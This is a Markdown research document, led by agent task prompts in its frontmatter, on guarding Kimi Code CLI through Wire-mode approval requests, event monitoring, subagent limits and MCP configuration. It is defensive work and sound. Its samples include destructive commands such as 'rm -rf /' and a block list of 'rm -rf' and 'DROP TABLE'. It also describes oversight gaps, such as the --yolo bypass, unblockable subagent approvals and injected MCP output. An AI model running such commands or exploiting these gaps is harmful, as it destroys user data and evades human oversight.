---
prompt: |-
    ## Focus

    This document covers how an Agentic CLI can be configured and run in a way that is both permissive enough to get work done efficiently while also being careful not to allow damaging actions to take place.

    **Identify which Agentic CLI this document covers from the document's filename and H1 heading.** All research must be specific to that CLI.

    The areas this research will focus on include:

    1. Event Hooks

        - PRE-TOOL:
            - One way to protect against damaging actions is to configure hooks that evaluate "pre-tool" calls and either _block_ or force _user approval_ before allowing commands which fit certain known patterns that indicate dangerous potential.
        - USER-PROMPT:
            - Some agents provide an event which allows all user prompts to be reviewed and modified before being recognized and processed by the Agent.
            - Where this is available, it is very helpful for scanning for dangerous patterns. The content tends to be less structured than what you'd get for a pre-tool call but it can still be helpful.
        - OTHER EVENTS:
            - While the pre-tool hook is the most common lifecycle event used for protection, the Agent may expose other events (e.g., post-tool, notification, session lifecycle, context compaction) that can also contribute to safety when used correctly.
            - Document any such events, what they trigger on, whether they can block execution, and how they might be used defensively.

        When considering Event Hooks as a protective measure, it is critical to understand and document:

        - Does this event fire not only for basic prompts but also in subagent/orchestrated flows?
            - If it doesn't always fire, specify exactly where it does and does not.
        - If an event fires but is not "blocking" (meaning listeners can STOP or MODIFY execution) then it is much more limited in its effectiveness.
            - Always describe whether event listeners can return a value to modify behavior and what behaviors they can "influence" or "guarantee".
        - What is the configuration format for hooks? (JSON, TOML, YAML, etc.)
        - Where are hooks configured? (user scope, project scope, managed/enterprise scope)
        - Can hooks be defined inline in skills, agents, or other component files?

    2. Intercepting MCP Calls

        MCP servers can be useful for gathering or synthesizing information but their responses are typically not checked by an Agent's event system and can contain secrets or embedded instructions to do something harmful.

        Research and document these specifics:

        - Where are MCP servers configured? At what scopes (user, project, enterprise)?
        - Are there any events the Agent provides to intercept the MCP response before it is fed back into the Agent's processing flow?
            - Does the event allow modification of the response before it's used?
            - Does the event allow stopping the Agentic flow if needed?
        - How are environment variables passed into the MCP server?
        - Do local MCP binaries require fully qualified paths?
        - Are local (stdio) MCP services allowed? Are remote (HTTP/SSE) MCP services allowed?
        - Does the Agent support any authentication regimes for MCP services (OAuth, API keys, bearer tokens)?
        - Can MCP servers be allow-listed or deny-listed at the enterprise/managed level?

    3. Completion Gates

        Attaching to events that mark the "completion" of a task gives an opportunity to:

        1. Run tests or other validation to verify that work is actually DONE and force the Agent to continue when it's not
        2. Scan for changes and look for "secrets" or sensitive data that shouldn't be in files, and take corrective action

        Research and document these specifics:

        - What events (if any) fire when the Agent considers its work complete? (e.g., stop events, task completion events, turn completion)
        - Can these completion events be blocked to force the Agent to continue working?
        - Is there a risk of infinite loops when blocking completion, and if so, how is that mitigated?
        - Can completion hooks run external commands (test suites, linters, secret scanners)?
        - Are there separate events for main agent completion vs. subagent completion?
        - Can completion hooks inject feedback or instructions back into the Agent?

    4. Subagents as a Security Event

        Having the ability to orchestrate and run concurrently via subagents is a feature, but because some Agent platforms provide a hook/event model that DOESN'T fire on subagents, we may need to treat the creation of a subagent as a security event.

        Through thorough research, determine whether the Agent supports event hooks not only from the originating/root-level tasks but throughout the flow and subagent process. If it does, document this clearly along with any quirks or gotchas. If it does not, explore how to mitigate this increased risk.

        - Can we detect a subagent's creation reliably via events?
        - Do pre-tool and post-tool hooks fire inside subagents the same as they do in the main agent?
        - Can we force a stricter permissions profile on a subagent when it runs?
        - Can we limit MCP servers to only "read-only" variants within subagents?
        - Can we reduce access to shell/filesystem tools for subagents?
        - Can context or instructions be injected into subagents at creation time?

    5. Escalated Privileges

        If the Agent is running as "root" or another user with escalated privileges, it has much greater potential for harm. Research how the Agent handles this:

        - Does the Agent automatically detect and warn about running as root or with elevated privileges?
        - Is there a way to detect and respond to elevated privileges via configuration or hooks/events?
        - Does the Agent provide sandboxing or container-based isolation?
        - Can filesystem write paths be restricted?
        - Can network access be restricted or controlled?
        - Is there a "dangerous" or "bypass permissions" mode, and if so, what safeguards exist around it?

    ## Task

    - Your task is to _update_ the research in the body of this file. If it's empty or contains only skeleton headings, create the content from scratch.
    - **Identify the target Agentic CLI from this document's filename and H1 heading.** All research must be specific to that CLI.
    - Be THOROUGH and SURE of your answer before updating the documentation.
        - If you find conflicting information from different sources, SAY THAT explicitly — this is as valuable as a definitive answer.
        - If a capability is NOT SUPPORTED by this CLI, state that clearly rather than omitting the section.
    - Always provide Markdown links to the sources you used for your research, inline or in a Sources section per topic.

    **IMPORTANT:** You must use the "claudine" skill when executing this task.
    **IMPORTANT:** Preserve all frontmatter properties that exist in this document. Your updates will only be to the BODY of this document.

    ## Built in Tools

    All Agentic platforms have a built-in tools which they use to solve problems with. You need to research what tools the Agent platform you're focusing on provides. List out all the built-in tools with:

    - a name,
    - description,
    - parameters provided to the tool,
    - and 2-3 examples of how this tool might be called by the agent

    ### Permissions

    Each Agentic platforms will allow for the configuration of what tools are allowed and how their parameters can be constrained. Your task is to:

    - identify the best URL that documents the permission configuration for the Agent you are focused on
    - identify the various ways permission configuration is set:
        - user scoped configuration
        - repo scoped configuration
        - agent/subagent configuration?
        - slash command configuration?
        - CLI switch configuration?
        - others?
    - give 2-3 examples of how someone might configure their Agent and why they might do it that way

    ### Risk Vectors

    Once you've described the Agent's tools, evaluate where you think the greatest risks might be within the use of these tools. Create a markdown list of risks and for each risk:

    - describe the risk (with context)
    - discuss how this risk might be able to be identified in semi-structured or unstructured content
    - discuss how you might help to lower this risk based on what you know about the Agent's capabilities, configuration, and features
closure: |-
    ## Task

    - Your task is to review the BODY of this document and extract key information into the frontmatter.
    - If any required property is not clearly answered in the body, do further research to reach a conclusive answer.
    - **If a property genuinely does not apply to this Agentic CLI** (e.g., it has no MCP support), set string values to `"n/a"`, booleans to `null`, and lists to `[]`.

    The frontmatter properties you MUST add/update are:

    ### General

    - `agent_version` - string: the latest version of the Agent software at the time of this research. If no version number is available, use the latest known release date.

    ### Event Hooks

    - `has_blocking_pre_tool_event` - boolean: whether the Agent has an event that fires before a planned tool call AND whose return value can influence whether that call proceeds.
    - `pre_tool_influence`
        - `"n/a"` if `has_blocking_pre_tool_event` is false
        - `"influence"` if the return value can influence but not deterministically guarantee the outcome
        - `"guarantee"` if the return value deterministically controls the outcome (e.g., an exit code or JSON response the Agent must obey)
    - `pre_tool_actions` - list of actions the pre-tool event listener can perform. Only include actions the CLI actually supports:
        - `stop` - block the current tool call; the agent receives feedback and continues working
        - `exit` - stop the agent's work entirely, propagating to any parent process/orchestrator
        - `ask-stop` - present the tool call to the user for approval; if denied, the tool call is blocked
        - `ask-exit` - present the tool call to the user for approval; if denied, the agent's work is stopped entirely
        - For every action listed, add a subsection in the BODY describing how it would be achieved. Include a code example in whatever language/format hooks are written in for this CLI (shell script, Python, JSON config, etc.). Note any nuances, exceptions, or gotchas.
    - `pre_tool_subagent` - boolean: whether pre-tool hooks fire inside subagents (not just the main agent).
    - `user_prompt_event` - boolean: whether the Agent provides an event where user prompts can be received before processing.
    - If `user_prompt_event` is true, also set:
        - `user_prompt_blocking_event` - boolean: whether the user prompt event can block execution or force user confirmation
        - `user_prompt_mutation_event` - boolean: whether the user prompt event allows mutating the prompt before the Agent processes it
        - `user_prompt_subagent` - boolean: whether the user prompt event fires inside subagents
    - `other_events` - key/value dictionary of other events useful for safety. Keys are event names, values describe: what the event triggers on, whether it supports blocking/return values, and how it could be used defensively. Omit the property entirely if there are no additional relevant events.

    ### Intercepting MCP Calls

    - `mcp_supported` - boolean: whether the Agent supports MCP servers at all.
    - `mcp_docs` - URL to the Agent's MCP documentation (or `"n/a"`)
    - `mcp_config_user` - filepath to user-scoped MCP configuration (or `"n/a"`)
    - `mcp_config_repo` - filepath to repo-scoped MCP configuration (or `"n/a"`)
    - `mcp_event` - boolean: whether the Agent has a hook event that gives access to MCP server responses
    - `mcp_event_name` - name of the event providing access to MCP responses (or `"n/a"`)
    - `mcp_event_modifiable` - boolean: whether the MCP response can be modified before the Agent uses it
    - `mcp_event_stop` - boolean: whether the MCP response event allows stopping execution or requiring permission

    ### Completion Gates

    - `has_completion_event` - boolean: whether the Agent fires an event when it considers work complete
    - `completion_event_blocking` - boolean: whether the completion event can prevent the Agent from stopping
    - `completion_event_names` - list of event names that relate to task/turn completion (or `[]`)
    - `completion_loop_protection` - boolean: whether the Agent has built-in protection against infinite loops from blocking completion

    ### Subagents

    - `has_subagent_events` - boolean: whether subagent creation/completion fires events
    - `hooks_fire_in_subagents` - boolean: whether pre-tool and post-tool hooks fire inside subagents the same as the main agent (or `null` if unknown)
    - `subagent_permissions_configurable` - boolean: whether subagent permissions can be restricted independently

    ### Escalated Privileges

    - `has_sandbox` - boolean: whether the Agent provides sandbox or container-based isolation
    - `detects_elevated_privileges` - boolean: whether the Agent detects and warns about running as root or elevated
    - `has_bypass_mode` - boolean: whether the Agent has a mode that bypasses permission checks entirely

    ### Metadata

    Before you finish, set:

    - `last_updated` to the current date in the format YYYY-MM-DD
    - `body_hash` to the xxHash value for this document's Markdown body content (not frontmatter)
        - Compute by printing the body content and piping to `bh` as STDIN
        - If the `bh` utility is not found in the executable path, leave this blank

    ## Built in Tools

    Make sure to add the following properties to this document's Frontmatter:

    - `permissions_url` - the URL for documentation on setting permissions on the agent.
    - `built_in_tools` - should be a dictionary where the _keys_ are the tool name and the _values_ are the description of the tool along with a usage example.
    - `risk_vectors` - should be a list of named risks, along with how to identify this risk, and ideas on how the Agent might be able to lower this risk.
agent_version: "1.12.0"
has_blocking_pre_tool_event: true
pre_tool_influence: guarantee
pre_tool_actions:
    - stop
    - exit
    - ask-stop
    - ask-exit
pre_tool_subagent: true
user_prompt_event: true
user_prompt_blocking_event: false
user_prompt_mutation_event: false
user_prompt_subagent: true
other_events:
    ToolResult: "Fires after tool execution completes (notification, non-blocking). Includes tool_call_id, is_error, and output. Defensive use: post-hoc audit for leaked secrets or credentials; can flag issues and cancel the current turn."
    StatusUpdate: "Fires with telemetry including context_usage (0-1 float) and token_usage (notification, non-blocking). Defensive use: monitor context_usage approaching 1.0 as a signal that compaction may degrade safety instruction retention."
    CompactionBegin: "Fires when context compaction (history compression) starts (notification, non-blocking). Defensive use: paired with CompactionEnd to detect when safety instructions may be lost."
    CompactionEnd: "Fires when context compaction completes (notification, non-blocking). Defensive use: re-inject safety-critical instructions via a new prompt after compaction."
    StepInterrupted: "Fires when the current step is interrupted (notification, non-blocking). Defensive use: detect unexpected interruptions that may indicate resource limits or errors leading to degraded safety behavior."
    SubagentEvent: "Wraps any Wire event from a subagent, including nested subagent events (notification, non-blocking at wrapper level). Defensive use: full visibility into subagent operations for audit and monitoring."
mcp_supported: true
mcp_docs: "https://moonshotai.github.io/kimi-cli/en/customization/mcp.html"
mcp_config_user: "~/.kimi/mcp.json"
mcp_config_repo: "n/a"
mcp_event: false
mcp_event_name: "n/a"
mcp_event_modifiable: false
mcp_event_stop: false
has_completion_event: true
completion_event_blocking: false
completion_event_names:
    - TurnEnd
completion_loop_protection: false
has_subagent_events: true
hooks_fire_in_subagents: null
subagent_permissions_configurable: true
has_sandbox: false
detects_elevated_privileges: false
has_bypass_mode: true
last_updated: "2026-02-20"
body_hash: 10059056850907409831
---

# Protecting Kimi Code CLI

> **Agent:** Kimi Code CLI v1.12.0 (2026-02-11) by [Moonshot AI](https://www.kimi.com/code)
> **Source repository:** [MoonshotAI/kimi-cli](https://github.com/MoonshotAI/kimi-cli) (Apache-2.0)
> **Documentation:** [moonshotai.github.io/kimi-cli/en/](https://moonshotai.github.io/kimi-cli/en/)

Kimi Code CLI does **not** use a file-based hook system like Claude Code or Gemini CLI. Instead, it exposes its entire event surface through **Wire mode** (`kimi --wire`), a JSON-RPC 2.0 bidirectional protocol over stdin/stdout. External programs observe events (notifications), respond to blocking requests, and control the agent turn lifecycle. This architectural difference has fundamental implications for protection strategies: rather than configuring hooks in a settings file, you must build or run a Wire client process that wraps the Kimi agent and applies protection logic programmatically.

---

## Event Hooks

### Configuration Format and Scope

Kimi Code CLI has **no hook configuration file**. There is no `hooks` key in `~/.kimi/config.toml`, no equivalent to Claude Code's `settings.json` hooks array, and no project-scoped or enterprise-scoped hook configuration. All event interaction happens over the [Wire protocol](https://moonshotai.github.io/kimi-cli/en/customization/wire-mode.html) at runtime.

| Aspect | Value |
|--------|-------|
| Configuration format | JSON-RPC 2.0 over stdin/stdout (Wire mode) |
| User-scoped hook config | Not supported |
| Project-scoped hook config | Not supported |
| Enterprise/managed hook config | Not supported |
| Inline hooks in skills/agents | Not supported |
| SDK wrappers | Go, Node.js, Python ([kimi-agent-sdk](https://github.com/MoonshotAI/kimi-agent-sdk)) |

To act as a protection layer, you must launch Kimi in Wire mode and proxy all events through your client:

```bash
# Launch Kimi in Wire mode
kimi --wire
```

### PRE-TOOL: ApprovalRequest (Blocking)

Kimi Code CLI does **not** have a direct `PreToolUse` equivalent notification that fires before every tool call. Instead, it uses a two-part mechanism:

1. **`ToolCall` notification** (non-blocking): fires when the agent plans a tool call. This is a fire-and-forget notification -- the client **cannot** prevent or modify the call by responding to it. The tool name and arguments are available but the call is already committed.

2. **`ApprovalRequest` blocking request**: for tools that require approval (Shell commands, file writes, MCP tool calls), the agent sends an `ApprovalRequest` and **halts** until the Wire client responds. This is the primary pre-tool interception point.

The `ApprovalRequest` is a true blocking gate with a **guaranteed** outcome: the client's response deterministically controls whether the tool executes.

**Request payload:**

```json
{
  "jsonrpc": "2.0",
  "method": "request",
  "id": "req_abc123",
  "params": {
    "type": "ApprovalRequest",
    "payload": {
      "id": "req_abc123",
      "tool_call_id": "tc_abc123",
      "sender": "Shell",
      "action": "execute_command",
      "description": "Run: rm -rf /tmp/build",
      "display": [
        {
          "type": "shell",
          "language": "sh",
          "command": "rm -rf /tmp/build"
        }
      ]
    }
  }
}
```

**Available response values:**

| Response | Effect |
|----------|--------|
| `"approve"` | Execute this single tool call |
| `"approve_for_session"` | Execute and auto-approve similar operations for the session |
| `"reject"` | Block the tool call; the agent adjusts its plan |

#### Action: `stop` -- Block the Current Tool Call

Respond with `"reject"` to the `ApprovalRequest`. The agent receives feedback that the tool call was denied and continues working with an adjusted plan.

```python
# Python Wire client example: block a dangerous shell command
import json, sys

def handle_request(msg):
    params = msg["params"]
    if params["type"] == "ApprovalRequest":
        payload = params["payload"]
        command = payload.get("description", "")
        # Block destructive commands
        if any(pattern in command for pattern in ["rm -rf", "DROP TABLE", "format"]):
            response = {
                "jsonrpc": "2.0",
                "id": msg["id"],
                "result": {
                    "request_id": payload["id"],
                    "response": "reject"
                }
            }
            sys.stdout.write(json.dumps(response) + "\n")
            sys.stdout.flush()
            return
        # Approve safe operations
        response = {
            "jsonrpc": "2.0",
            "id": msg["id"],
            "result": {
                "request_id": payload["id"],
                "response": "approve"
            }
        }
        sys.stdout.write(json.dumps(response) + "\n")
        sys.stdout.flush()
```

**Gotchas:**
- Only tools that require approval emit `ApprovalRequest`. In `--yolo` mode, `ApprovalRequest` is **never sent** and all operations are auto-approved, completely bypassing this protection mechanism.
- If the client does not respond, the agent stalls indefinitely. Implement timeouts.
- `approve_for_session` is dangerous in automated pipelines since it creates a blanket approval for similar operations.

#### Action: `exit` -- Stop the Agent Entirely

There is no dedicated "exit" response on the `ApprovalRequest`. To stop the agent entirely, a Wire client can:

1. Respond with `"reject"` to the current `ApprovalRequest`.
2. Immediately send a `cancel` client request to abort the running turn.
3. Close the Wire connection or terminate the process.

```python
# Reject the approval, then cancel the turn
def reject_and_exit(msg):
    # Step 1: Reject the tool call
    reject_response = {
        "jsonrpc": "2.0",
        "id": msg["id"],
        "result": {
            "request_id": msg["params"]["payload"]["id"],
            "response": "reject"
        }
    }
    sys.stdout.write(json.dumps(reject_response) + "\n")
    sys.stdout.flush()

    # Step 2: Cancel the turn
    cancel_request = {
        "jsonrpc": "2.0",
        "method": "cancel",
        "id": "cancel_001",
        "params": {}
    }
    sys.stdout.write(json.dumps(cancel_request) + "\n")
    sys.stdout.flush()
```

**Gotchas:**
- `cancel` only works if a turn is currently in progress (otherwise returns error `-32000`).
- After cancellation, the `prompt` response resolves with `status: "cancelled"`.
- There is no mechanism to propagate a "fatal error" to a parent orchestrator; the Wire client must handle orchestration-level exit logic itself.

#### Action: `ask-stop` -- Present to User for Approval, Block if Denied

The Wire client can surface the `ApprovalRequest` to a human operator through its own UI and relay the human's decision back.

```python
def ask_user_and_stop_if_denied(msg):
    payload = msg["params"]["payload"]
    # Surface to user (this could be a terminal prompt, web UI, Slack message, etc.)
    print(f"[APPROVAL REQUIRED] {payload['sender']}: {payload['description']}", file=sys.stderr)
    user_choice = input("Approve? (y/n/s=session): ").strip().lower()

    if user_choice == "y":
        decision = "approve"
    elif user_choice == "s":
        decision = "approve_for_session"
    else:
        decision = "reject"

    response = {
        "jsonrpc": "2.0",
        "id": msg["id"],
        "result": {
            "request_id": payload["id"],
            "response": decision
        }
    }
    sys.stdout.write(json.dumps(response) + "\n")
    sys.stdout.flush()
```

#### Action: `ask-exit` -- Present to User, Exit if Denied

Combine the user prompt pattern above with the cancel-and-exit pattern: if the user denies the operation, reject the approval and immediately cancel the turn.

### Gap: Non-Approval Tool Calls Have No Interception

A critical limitation: `ToolCall` is a **notification** (no response expected). For built-in tools that do NOT require approval (e.g., read-only file operations, web search in some configurations), there is no interception mechanism at all. The only way to ensure all tool calls go through the `ApprovalRequest` gate is to ensure `--yolo` is **not** enabled. Even then, the set of tools that require approval is determined by the agent's internal logic, not by the Wire client.

### USER-PROMPT: TurnBegin Notification

The `TurnBegin` event fires at the start of every agent turn and includes the `user_input` that initiated the turn.

```json
{
  "jsonrpc": "2.0",
  "method": "event",
  "params": {
    "type": "TurnBegin",
    "payload": {
      "user_input": "Delete all test files"
    }
  }
}
```

**Blocking:** No. `TurnBegin` is a fire-and-forget notification. The client receives it but **cannot** block or modify the prompt before the agent processes it.

**Mutation:** Not supported. The user input has already been submitted to the agent by the time `TurnBegin` fires.

**Subagents:** `TurnBegin` fires for the main agent's turn. Subagent turns are reported via nested `SubagentEvent` wrappers, which may contain their own `TurnBegin` events.

**Defensive use:** While `TurnBegin` cannot block execution, a Wire client can:
- Log user prompts for audit purposes.
- Parse the prompt for suspicious patterns and preemptively send a `cancel` request if dangerous intent is detected (though this is a race condition since the agent may already be processing).

### OTHER EVENTS Useful for Safety

#### `ToolResult` (Notification)

Reports the result of a tool execution after it completes. Non-blocking.

| Field | Description |
|-------|-------------|
| `tool_call_id` | Correlates with the original `ToolCall` |
| `return_value.is_error` | Whether the tool failed |
| `return_value.output` | Tool output content |

**Defensive use:** Post-hoc audit. Scan tool outputs for leaked secrets, credentials, or unexpected patterns. While you cannot undo the tool call, you can flag the issue and cancel the current turn.

#### `StatusUpdate` (Notification)

Reports telemetry including `context_usage` (0-1 float) and `token_usage` breakdown.

**Defensive use:** Monitor `context_usage` approaching 1.0 as a signal that compaction is about to occur, which could affect the agent's memory of security constraints.

#### `CompactionBegin` / `CompactionEnd` (Notifications)

Signal context compaction (history compression) events.

**Defensive use:** Context compaction can cause the agent to "forget" safety instructions injected earlier in the conversation. A Wire client can detect `CompactionEnd` and re-inject safety-critical instructions via a new `prompt` after the current turn completes.

#### `StepInterrupted` (Notification)

Indicates the current step was interrupted.

**Defensive use:** Detect unexpected interruptions that might indicate the agent is hitting resource limits or encountering errors that could lead to degraded safety behavior.

#### `SubagentEvent` (Notification)

Wraps any event from a subagent. See the [Subagents section](#subagents-as-security-event) for details.

### Summary: Event Blocking Capabilities

| Event | Type | Blocking | Can Modify | Fires in Subagents |
|-------|------|----------|------------|-------------------|
| `ApprovalRequest` | Request | Yes (agent halts) | No (approve/reject only) | Yes (via SubagentEvent) |
| `ToolCallRequest` | Request | Yes (agent halts) | Yes (return value) | Unknown |
| `TurnBegin` | Notification | No | No | Yes (via SubagentEvent) |
| `ToolCall` | Notification | No | No | Yes (via SubagentEvent) |
| `ToolResult` | Notification | No | No | Yes (via SubagentEvent) |
| `TurnEnd` | Notification | No | No | Yes (via SubagentEvent) |

### Sources

- [Wire Mode documentation](https://moonshotai.github.io/kimi-cli/en/customization/wire-mode.html)
- [Interaction guide](https://moonshotai.github.io/kimi-cli/en/guides/interaction.html)
- [kimi command reference](https://moonshotai.github.io/kimi-cli/en/reference/kimi-command.html)

---

## Intercepting MCP Calls

### MCP Configuration

Kimi Code CLI supports MCP servers. Configuration is stored at the **user scope only** in `~/.kimi/mcp.json`, using the standard MCP client format.

| Scope | Config Location | Supported |
|-------|-----------------|-----------|
| User | `~/.kimi/mcp.json` | Yes |
| Project/Repo | Not supported | No |
| Enterprise/Managed | Not supported | No |

**Project-scoped MCP is not natively supported.** However, the `--mcp-config-file /path/to/mcp.json` flag allows loading an alternate MCP configuration at runtime, which could be used to point at a project-local file. Similarly, `--mcp-config '{"mcpServers": {...}}'` allows inline JSON configuration.

### MCP Configuration Format

```json
{
  "mcpServers": {
    "my-server": {
      "url": "https://example.com/mcp",
      "headers": {
        "Authorization": "Bearer sk-..."
      }
    },
    "local-tool": {
      "command": "npx",
      "args": ["-y", "my-mcp-tool@latest"],
      "env": {
        "MY_API_KEY": "value"
      }
    }
  }
}
```

### Transport Types

| Transport | Supported | Configuration Key |
|-----------|-----------|-------------------|
| HTTP (remote) | Yes | `url` + optional `headers` |
| stdio (local) | Yes | `command` + `args` + optional `env` |

Local MCP binaries do **not** require fully qualified paths; the `command` field follows standard `PATH` resolution (e.g., `"npx"`, `"node"`, `"python"`).

### Environment Variables

Environment variables for MCP servers are passed via the `env` key in the server configuration object. These are injected into the spawned process environment for stdio-based servers.

### Authentication

Kimi Code CLI supports the following authentication regimes for MCP servers:

1. **Header-based API keys**: Passed via the `headers` configuration key.
2. **OAuth**: Use `kimi mcp auth <server>` to complete an OAuth authorization flow. Tokens are saved at `~/.kimi/credentials/mcp_auth.json` (mode 600) for future use.
3. **Bearer tokens**: Passed via `headers` as `"Authorization": "Bearer <token>"`.

### MCP Event Interception

**There is no dedicated MCP response interception event.** MCP tool calls are treated as regular tool calls by the Wire protocol:

- An `ApprovalRequest` is sent for MCP tool calls that require confirmation (matching the behavior of built-in tools).
- The `ToolCall` notification fires when an MCP tool is invoked.
- The `ToolResult` notification fires after the MCP tool completes.

However, there is **no event that exposes the raw MCP response before it is fed into the agent's context**. The Wire client can observe the `ToolResult` post-hoc but cannot modify or block the MCP response before the agent uses it.

### Allow-listing and Deny-listing

Kimi Code CLI has **no built-in mechanism** for allow-listing or deny-listing MCP servers at the enterprise or managed level. MCP server management is done via `kimi mcp add/remove/list/test` commands, which operate on the user-scoped `~/.kimi/mcp.json` file.

A Wire client could implement its own allow/deny logic by intercepting `ApprovalRequest` messages where `payload.sender` corresponds to an MCP tool and rejecting calls to disallowed servers.

### MCP Security Recommendations

The [MCP documentation](https://moonshotai.github.io/kimi-cli/en/customization/mcp.html) explicitly warns about prompt injection risks and recommends:
- Only trust MCP servers from verified sources.
- Verify AI-proposed operations are reasonable.
- Maintain manual approval for high-risk tasks.
- Avoid `--yolo` mode when using untrusted MCP servers.

### Sources

- [Model Context Protocol documentation](https://moonshotai.github.io/kimi-cli/en/customization/mcp.html)
- [Configuration files](https://moonshotai.github.io/kimi-cli/en/configuration/config-files.html)
- [Data locations](https://moonshotai.github.io/kimi-cli/en/configuration/data-locations.html)

---

## Completion Gates

### Completion Events

Kimi Code CLI exposes two events related to turn/task completion:

1. **`TurnEnd` notification** (Wire protocol 1.2+): Fires when a turn ends cleanly. This is a fire-and-forget notification -- the client **cannot** block it or force the agent to continue.

2. **`prompt` response**: The response to the initial `prompt` client request. Contains a `status` field:
   - `"finished"` -- turn completed normally
   - `"cancelled"` -- turn was cancelled via `cancel`
   - `"max_steps_reached"` -- hit the step limit

### Can Completion Be Blocked?

**No.** Neither `TurnEnd` nor the `prompt` response is blocking. There is no mechanism to reject a completion event and force the agent to continue working. The agent decides when the turn is complete, and the Wire client is informed after the fact.

### Workaround: Sequential Prompt Chaining

While you cannot block completion, a Wire client can implement completion gate logic by:

1. Observing the `prompt` response with `status: "finished"`.
2. Running external validation (tests, linters, secret scanners) as a shell subprocess.
3. If validation fails, sending a new `prompt` with feedback instructions.

```python
import subprocess

def completion_gate(prompt_result):
    if prompt_result["status"] != "finished":
        return  # Only gate on successful completion

    # Run external validation
    result = subprocess.run(
        ["secret-scanner", "--check", "."],
        capture_output=True, text=True
    )

    if result.returncode != 0:
        # Secrets found -- send corrective prompt
        feedback = {
            "jsonrpc": "2.0",
            "method": "prompt",
            "id": "gate_001",
            "params": {
                "user_input": f"SECURITY ISSUE: The following secrets were detected in your changes. Remove them immediately:\n{result.stdout}"
            }
        }
        sys.stdout.write(json.dumps(feedback) + "\n")
        sys.stdout.flush()
```

### Infinite Loop Protection

Since completion cannot be blocked, there is no built-in infinite loop risk from completion gates. However, if a Wire client implements the "send a new prompt on failure" pattern above, the client must implement its own loop protection:

- Track the number of corrective prompts sent.
- Set a maximum retry count.
- The `loop_control.max_steps_per_turn` config setting (default: 100) limits the number of steps per individual turn, providing a natural bound.

### Main Agent vs. Subagent Completion

- **Main agent**: `TurnEnd` + `prompt` response.
- **Subagent**: Subagent completion is reported via nested `SubagentEvent` wrappers containing the subagent's own `TurnEnd`. The main agent's `ToolResult` for the Task tool reports the subagent's final output.

There is no separate "subagent completed" event at the top level -- subagent events are always nested inside `SubagentEvent`.

### Sources

- [Wire Mode documentation](https://moonshotai.github.io/kimi-cli/en/customization/wire-mode.html)
- [Configuration files](https://moonshotai.github.io/kimi-cli/en/configuration/config-files.html)

---

## Subagents as Security Event?

### Subagent Event Visibility

Kimi Code CLI provides the `SubagentEvent` notification, which **wraps any Wire event from a subagent**:

```json
{
  "jsonrpc": "2.0",
  "method": "event",
  "params": {
    "type": "SubagentEvent",
    "payload": {
      "task_tool_call_id": "tc_task_001",
      "event": {
        "type": "ToolCall",
        "payload": {
          "type": "function",
          "id": "tc_sub_001",
          "function": {
            "name": "Shell",
            "arguments": "{\"command\": \"rm -rf /\"}"
          }
        }
      }
    }
  }
}
```

**Key properties:**
- `task_tool_call_id` links back to the parent Task tool call that spawned the subagent.
- `event` contains the full nested Wire event (any event type).
- `SubagentEvent` can be recursive: a subagent spawning its own subagent produces nested `SubagentEvent` wrappers.

### Can Subagent Creation Be Detected?

**Yes**, but indirectly. Subagents are spawned via the **Task** tool. The parent agent's `ToolCall` notification with `function.name == "Task"` signals a subagent is being created. If the Task tool requires approval, an `ApprovalRequest` fires first, giving the Wire client a chance to reject the subagent creation.

### Do Hooks Fire Inside Subagents?

**Yes, with caveats.** All subagent events (including `ToolCall`, `ApprovalRequest`, `ToolResult`, `TurnBegin`, `TurnEnd`) are delivered to the Wire client via the `SubagentEvent` wrapper. The Wire client receives full visibility into subagent operations.

However, `ApprovalRequest` messages from inside subagents are delivered as notifications inside `SubagentEvent`, **not** as blocking requests at the top level. This means the Wire client **observes** the approval request but it is unclear from the documentation whether the client can respond to approval requests originating from subagents through the Wire protocol. The subagent's own approval handling may be internal.

**Conflicting information:** The documentation states that `SubagentEvent` wraps "any event type" but the examples only show notification-type events. Whether blocking requests (`ApprovalRequest`, `ToolCallRequest`) from subagents are surfaced as top-level blocking requests or as nested notifications is not explicitly clarified. If they are notifications only, this represents a significant security gap where subagent tool calls cannot be individually approved/rejected by the Wire client.

### Subagent Permissions Configuration

Kimi Code CLI provides **strong subagent permission controls** through the agent YAML configuration:

1. **Tool restriction via `tools` and `exclude_tools`**: Subagent YAML files specify exactly which tools are available. You can exclude dangerous tools:

    ```yaml
    # reviewer-sub.yaml
    version: 1
    agent:
      name: reviewer
      extend: ./main-agent.yaml
      exclude_tools:
        - "kimi_cli.tools.shell:Shell"
        - "kimi_cli.tools.file:WriteFile"
        - "kimi_cli.tools.multiagent:Task"  # Prevent nested subagents
      system_prompt_path: ./reviewer-prompt.md
    ```

2. **Preventing nested subagent spawning**: Exclude the `Task` tool from subagent definitions to prevent recursion.

3. **Isolated contexts**: Subagents run in isolated contexts and do not share the main agent's conversation history.

### Can MCP Be Restricted for Subagents?

**Not directly.** MCP configuration is global (`~/.kimi/mcp.json`) and applies to all agents and subagents. There is no per-subagent MCP configuration. However, since subagent tool lists are explicitly configured, you can exclude MCP tools from a subagent's tool list if the MCP tools are registered as named tools.

### Can Context Be Injected at Subagent Creation?

**Yes.** Subagent definitions include a `system_prompt_path` that points to a Markdown prompt template. This prompt is loaded when the subagent starts and can include security-specific instructions. Additionally, `system_prompt_args` allows injecting custom variables:

```yaml
subagents:
  secure_worker:
    path: ./secure-worker.yaml
    description: "Worker with restricted permissions"

# secure-worker.yaml
version: 1
agent:
  name: secure_worker
  extend: ./main-agent.yaml
  exclude_tools:
    - "kimi_cli.tools.shell:Shell"
  system_prompt_path: ./secure-prompt.md
  system_prompt_args:
    SECURITY_LEVEL: "high"
    ALLOWED_PATHS: "/tmp/workspace"
```

### Sources

- [Agents and Subagents documentation](https://moonshotai.github.io/kimi-cli/en/customization/agents.html)
- [Wire Mode documentation](https://moonshotai.github.io/kimi-cli/en/customization/wire-mode.html)

---

## Escalated Privileges

### Root / Elevated Privilege Detection

Kimi Code CLI does **not** automatically detect or warn about running as root or with elevated privileges. There is no built-in check for `UID == 0`, no warning banner, and no configuration option to enforce non-root execution. The documentation does not address this topic.

### Sandboxing and Container Isolation

Kimi Code CLI does **not** provide built-in sandboxing or container-based isolation. It runs as a standard user-space process with the same filesystem and network access as the user who launched it. There is no equivalent to Claude Code's `--dangerously-skip-permissions` sandboxing integration.

A lightweight Rust implementation ([kimi-agent-rs](https://github.com/MoonshotAI/kimi-agent-rs)) exists for Wire-mode-only usage, which has a smaller attack surface but still does not provide sandboxing.

### Filesystem Write Path Restrictions

**Not natively supported.** The `--work-dir` flag sets the working directory but does not restrict file operations to that directory. Absolute paths can still be used to read/write anywhere the user has access. Subagent YAML definitions can exclude the `WriteFile` tool to prevent writes, but this is a tool-level restriction, not a filesystem-level one.
